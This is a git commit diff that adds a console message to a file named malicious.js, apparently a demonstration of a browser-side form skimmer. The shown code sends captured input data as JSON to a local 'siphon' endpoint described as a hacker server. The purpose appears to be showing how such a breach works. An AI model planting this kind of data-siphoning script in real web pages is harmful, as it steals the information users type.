80706fbb7a39ca00bf17eff2c03e4db652cec6cf
Miki Rezentes <miki@spreedly.com>
2016-09-22 17:17:03 -0400

    Add console logging to show breach

--- public/malicious.js
+++ public/malicious.js
@@ -24,7 +24,7 @@ var siphonFunction = function(e) {
 		xhttp.open("POST", "http://127.0.0.1:8081/siphon", true);
 		xhttp.setRequestHeader("Content-type", "application/json;charset=UTF-8");
 		xhttp.send(JSON.stringify(data));
-
+		console.log("You've been powned. Data sent to hacker server: " + JSON.stringify(data));
 }
 
 var addInputListeners = function () {
